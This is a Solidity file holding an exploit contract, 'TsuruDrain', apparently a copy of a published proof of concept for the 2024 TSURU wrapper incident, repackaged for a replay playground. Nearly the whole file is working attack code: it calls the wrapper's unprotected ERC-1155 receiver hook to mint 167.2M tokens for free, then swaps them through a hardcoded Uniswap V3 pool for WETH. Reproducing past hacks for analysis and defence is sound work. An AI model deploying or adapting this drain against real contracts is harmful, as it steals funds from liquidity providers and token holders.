// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

// Synthetic standalone exploit for the EVM Playground (2024-05-TSURU).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract
// (TsuruExploit is BaseTestWithBalanceLog, and calls onERC1155Received /
// the V3 swap directly as `address(this)`, with `uniswapV3SwapCallback` living
// on the test itself) — there is no standalone attack contract to deploy.
// This contract is a faithful, self-contained copy of that inline attack
// (testExploit + uniswapV3SwapCallback), so the playground can deploy it and
// record run(). Logic and constants are copied verbatim from
// evm-hack-registry/2024-05-TSURU_exp/test/TSURU_exp.sol.
//
// Root cause: TSURUWrapper.onERC1155Received (the ERC-1155 receiver hook) has
// no access control and never verifies an NFT was actually escrowed — it
// mints `amount * ERC1155_RATIO` straight from caller-supplied arguments.
// Calling it directly (msg.sender != erc1155Contract) mints free TSURU, which
// is then dumped into the TSURU/WETH Uniswap V3 pool for real WETH.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
}

interface IWrapper is IERC20 {
    function onERC1155Received(address, address from, uint256 id, uint256 amount, bytes calldata)
        external
        returns (bytes4);
}

interface IUniswapV3Pool {
    function swap(
        address recipient,
        bool zeroForOne,
        int256 amountSpecified,
        uint160 sqrtPriceLimitX96,
        bytes calldata data
    ) external returns (int256 amount0, int256 amount1);

    function token0() external view returns (address);
    function token1() external view returns (address);
}

contract TsuruDrain {
    // Uniswap V3 constants (copied verbatim from the DeFiHackLabs test).
    uint160 internal constant MIN_SQRT_RATIO = 4_295_128_739;
    uint160 internal constant MAX_SQRT_RATIO =
        1_461_446_703_485_210_103_287_273_052_203_988_822_378_723_970_342;

    address internal constant UNISWAP_V3_POOL = 0x913b1658dd001dFF93D3AF2A657523F1eed53917;
    address internal constant TSURU_WRAPPER = 0x75Ac62EA5D058A7F88f0C3a5F8f73195277c93dA;
    address internal constant WETH = 0x4200000000000000000000000000000000000006;

    uint256 internal constant MINT_AMOUNT = 418;
    uint256 internal constant EXPECTED_TOKENS = 167_200_000 ether;

    IWrapper internal constant wrapper = IWrapper(TSURU_WRAPPER);

    // step 0/1: call the unprotected ERC-1155 receiver hook directly — no NFT is
    // ever transferred in, but it mints 418 * ERC1155_RATIO = 167.2M TSURU for free.
    function run() external {
        wrapper.onERC1155Received(address(0), address(this), 0, MINT_AMOUNT, new bytes(0));
        require(wrapper.balanceOf(address(this)) == EXPECTED_TOKENS, "unexpected mint amount");

        // step 2/3: dump the freshly-minted TSURU into the V3 pool for WETH.
        _v3Swap(TSURU_WRAPPER, WETH, EXPECTED_TOKENS, address(this));
    }

    function _v3Swap(address tokenIn, address tokenOut, uint256 amount, address destTo) internal {
        if (amount == 0) return;
        bool zeroForOne = tokenIn < tokenOut;
        uint160 sqrt = zeroForOne ? MIN_SQRT_RATIO + 1 : MAX_SQRT_RATIO - 1;
        IUniswapV3Pool(UNISWAP_V3_POOL).swap(
            destTo, zeroForOne, int256(amount), sqrt, zeroForOne ? bytes("1") : bytes("")
        );
    }

    // step 4: V3 swap callback — pays the pool the owed TSURU, receives WETH.
    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata data) external {
        require(msg.sender == UNISWAP_V3_POOL, "Invalid caller");
        bool zeroForOne = data.length > 0;
        address tokenOut = zeroForOne
            ? IUniswapV3Pool(UNISWAP_V3_POOL).token0()
            : (IUniswapV3Pool(UNISWAP_V3_POOL).token0() == WETH ? TSURU_WRAPPER : WETH);

        uint256 amountOut = uint256(zeroForOne ? amount0Delta : amount1Delta);
        IERC20(tokenOut).transfer(msg.sender, amountOut);
    }
}
